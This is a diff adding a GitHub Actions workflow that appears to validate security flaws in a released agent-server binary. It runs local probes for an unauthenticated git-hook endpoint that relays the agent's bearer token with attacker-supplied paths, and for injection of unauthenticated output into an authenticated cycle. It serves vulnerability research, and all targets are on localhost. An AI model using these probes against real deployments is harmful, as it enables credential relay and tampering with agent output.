@@ -1,0 +1,164 @@
+name: Box guest unauthenticated handler impact
+on:
+  push:
+    paths:
+      - '.github/workflows/box-guest-unauth-impact.yml'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  validate-local:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate exact production guest binary locally
+        shell: bash
+        run: |
+          set -euo pipefail
+          O=box-guest-unauth-impact.txt
+          : > "$O"
+          rm -rf /tmp/boxguest && mkdir -p /tmp/boxguest/work
+          tag=agent-server-v0.0.49-ascii-prod29
+          curl -fL "https://github.com/ariana-dot-dev/agent-server/releases/download/$tag/ascii-agents-server-linux-x64" -o /tmp/boxguest/agent
+          chmod +x /tmp/boxguest/agent
+
+          cat >/tmp/boxguest/fake-claude <<'SH'
+          #!/usr/bin/env bash
+          if [[ " $* " == *" --version "* ]]; then
+            echo 'fake-claude 0.0.1'
+            exit 0
+          fi
+          # Hold the SDK request open long enough to exercise the concurrent
+          # unauthenticated cli-output endpoint. No network or model access.
+          sleep 10
+          exit 0
+          SH
+          chmod +x /tmp/boxguest/fake-claude
+
+          cat >/tmp/boxguest/crypto.js <<'JS'
+          const c=require('crypto');
+          const [mode,secret,input]=process.argv.slice(2);
+          const key=c.createHash('sha256').update(secret).digest();
+          if(mode==='enc'){
+            const iv=c.randomBytes(16);
+            const cipher=c.createCipheriv('aes-256-gcm',key,iv);
+            const plaintext=JSON.stringify({authKey:secret,data:JSON.parse(input)});
+            const ct=Buffer.concat([cipher.update(plaintext,'utf8'),cipher.final()]);
+            const tag=cipher.getAuthTag();
+            process.stdout.write(Buffer.concat([iv,tag,ct]).toString('base64'));
+          } else if(mode==='dec'){
+            const raw=Buffer.from(input,'base64'),iv=raw.subarray(0,16),tag=raw.subarray(16,32),ct=raw.subarray(32);
+            const d=c.createDecipheriv('aes-256-gcm',key,iv); d.setAuthTag(tag);
+            process.stdout.write(Buffer.concat([d.update(ct),d.final()]).toString('utf8'));
+          } else process.exit(2);
+          JS
+
+          cat >/tmp/boxguest/backend.py <<'PY'
+          from http.server import BaseHTTPRequestHandler,HTTPServer
+          import json
+          class H(BaseHTTPRequestHandler):
+            def do_POST(self):
+              n=int(self.headers.get('content-length','0')); b=self.rfile.read(n)
+              with open('/tmp/boxguest/backend-capture.txt','a') as f:
+                f.write('PATH='+self.path+'\n')
+                f.write('AUTH='+self.headers.get('authorization','')+'\n')
+                f.write('BODY='+b.decode('utf-8','replace')+'\n')
+              out=json.dumps({'exitCode':37}).encode()
+              self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Length',str(len(out))); self.end_headers(); self.wfile.write(out)
+            def log_message(self,*a): pass
+          HTTPServer(('127.0.0.1',19090),H).serve_forever()
+          PY
+          python3 /tmp/boxguest/backend.py >/tmp/boxguest/backend.log 2>&1 & bpid=$!
+
+          export MACHINE_ID=box-node-test-impact
+          export SHARED_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
+          export WORK_DIR=/tmp/boxguest/work
+          export HOME=/tmp/boxguest/work
+          export ASCII_PORT=18911
+          export IS_SANDBOX=1
+          export BACKEND_URL=http://127.0.0.1:19090
+          export BOX_CLI_API_URL=http://127.0.0.1:19090
+          export CLAUDE_PATH=/tmp/boxguest/fake-claude
+          export NO_PROXY=127.0.0.1,localhost
+          /tmp/boxguest/agent >/tmp/boxguest/agent.log 2>&1 & apid=$!
+          cleanup(){ kill "$apid" "$bpid" 2>/dev/null || true; wait "$apid" "$bpid" 2>/dev/null || true; }
+          trap cleanup EXIT
+          for i in $(seq 1 80); do curl -sS --max-time 1 http://127.0.0.1:18911/health >/dev/null 2>&1 && break; kill -0 "$apid" 2>/dev/null || break; sleep .25; done
+
+          echo "TAG=$tag" >> "$O"
+          echo "SHA256=$(sha256sum /tmp/boxguest/agent|awk '{print $1}')" >> "$O"
+          echo '=== unauthenticated route controls ===' >> "$O"
+          c=$(curl -sS --max-time 3 -o /tmp/boxguest/body -w '%{http_code}' -X POST http://127.0.0.1:18911/spokesperson/interrupt -H 'Content-Type: application/json' --data-binary '{"x":1}' || true)
+          echo "interrupt_without_envelope status=$c body=$(cat /tmp/boxguest/body)" >> "$O"
+          c=$(curl -sS --max-time 3 -o /tmp/boxguest/body -w '%{http_code}' -X POST http://127.0.0.1:18911/spokesperson/cli-output -H 'Content-Type: application/json' --data-binary '{"kind":"say","content":"BOXSEC_PRE_CYCLE"}' || true)
+          echo "cli_output_before_cycle status=$c body=$(cat /tmp/boxguest/body)" >> "$O"
+
+          models='{"claude-code":{"default":"dummy","utility":"dummy","models":[{"id":"dummy","label":"Dummy","sdkId":"dummy"}]}}'
+          start_data=$(python3 - <<PY
+          import json
+          print(json.dumps({"oneToken":"LOCAL_BACKEND_TOKEN_MARKER","agentType":"claude-code","productMode":"box","clearConversation":True,"modelsConfig":json.loads('''$models''')}))
+          PY
+          )
+          start_enc=$(node /tmp/boxguest/crypto.js enc "$SHARED_KEY" "$start_data")
+          curl -sS --max-time 20 -o /tmp/boxguest/start.json -w 'start_status=%{http_code}\n' -X POST http://127.0.0.1:18911/start -H 'Content-Type: application/json' --data-binary "{\"encrypted\":\"$start_enc\"}" >> "$O"
+          echo "start_body=$(cat /tmp/boxguest/start.json | head -c 400)" >> "$O"
+
+          echo '=== unauthenticated git-hook confused-deputy relay ===' >> "$O"
+          : >/tmp/boxguest/backend-capture.txt
+          hook='{"hookType":"pre_commit","repoPath":"ATTACKER_CONTROLLED_REPOPATH","branch":"ATTACKER_BRANCH","stagedFiles":["ATTACKER_FILE"]}'
+          hc=$(curl -sS --max-time 5 -o /tmp/boxguest/hook.json -w '%{http_code}' -X POST http://127.0.0.1:18911/git-hook-event -H 'Content-Type: application/json' --data-binary "$hook" || true)
+          echo "git_hook_unauth status=$hc body=$(cat /tmp/boxguest/hook.json)" >> "$O"
+          cat /tmp/boxguest/backend-capture.txt >> "$O" || true
+
+          echo '=== unauthenticated spokesperson output injection during authenticated cycle ===' >> "$O"
+          cycle_data='{"conversationGroupId":"boxsec-local-cycle","cyclePrompt":"local validation only"}'
+          cycle_enc=$(node /tmp/boxguest/crypto.js enc "$SHARED_KEY" "$cycle_data")
+          curl -sS --max-time 30 -o /tmp/boxguest/cycle.json -w '%{http_code}' -X POST http://127.0.0.1:18911/spokesperson/cycle -H 'Content-Type: application/json' --data-binary "{\"encrypted\":\"$cycle_enc\"}" >/tmp/boxguest/cycle.status & cpid=$!
+
+          injected=0
+          for i in $(seq 1 80); do
+            code=$(curl -sS --max-time 1 -o /tmp/boxguest/inject.body -w '%{http_code}' -X POST http://127.0.0.1:18911/spokesperson/cli-output -H 'Content-Type: application/json' --data-binary '{"kind":"say","content":"BOXSEC_UNAUTH_MARKER"}' 2>/dev/null || true)
+            if [ "$code" = 200 ]; then injected=1; break; fi
+            sleep .1
+          done
+          echo "unauth_cli_injection_accepted=$injected status=${code:-none} body=$(cat /tmp/boxguest/inject.body 2>/dev/null || true)" >> "$O"
+          wait "$cpid" || true
+          echo "cycle_http_status=$(cat /tmp/boxguest/cycle.status 2>/dev/null || true)" >> "$O"
+          if jq -e '.encrypted' /tmp/boxguest/cycle.json >/dev/null 2>&1; then
+            enc=$(jq -r '.encrypted' /tmp/boxguest/cycle.json)
+            dec=$(node /tmp/boxguest/crypto.js dec "$SHARED_KEY" "$enc" || true)
+            echo "cycle_decrypted=$dec" >> "$O"
+            if printf '%s' "$dec" | grep -q 'BOXSEC_UNAUTH_MARKER'; then echo 'SPOKESPERSON_OUTPUT_INJECTION=CONFIRMED' >> "$O"; else echo 'SPOKESPERSON_OUTPUT_INJECTION=NOT_CONFIRMED' >> "$O"; fi
+          else
+            echo "cycle_raw=$(cat /tmp/boxguest/cycle.json | head -c 1200)" >> "$O"
+            echo 'SPOKESPERSON_OUTPUT_INJECTION=NOT_CONFIRMED' >> "$O"
+          fi
+
+          if grep -q '^AUTH=Bearer LOCAL_BACKEND_TOKEN_MARKER$' /tmp/boxguest/backend-capture.txt && grep -q 'ATTACKER_CONTROLLED_REPOPATH' /tmp/boxguest/backend-capture.txt && grep -q '"exitCode":37' /tmp/boxguest/hook.json; then
+            echo 'GIT_HOOK_CREDENTIALLED_RELAY=CONFIRMED' >> "$O"
+          else
+            echo 'GIT_HOOK_CREDENTIALLED_RELAY=NOT_CONFIRMED' >> "$O"
+          fi
+
+          echo '=== agent tail ===' >> "$O"
+          tail -n 120 /tmp/boxguest/agent.log >> "$O" || true
+          cat "$O"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: box-guest-unauth-impact
+          path: box-guest-unauth-impact.txt
+          if-no-files-found: warn
+      - name: Commit validation result
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          [ -f box-guest-unauth-impact.txt ] || exit 0
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add box-guest-unauth-impact.txt
+          git diff --cached --quiet && exit 0
+          git commit -m 'research: record guest unauthenticated handler validation'
+          git push
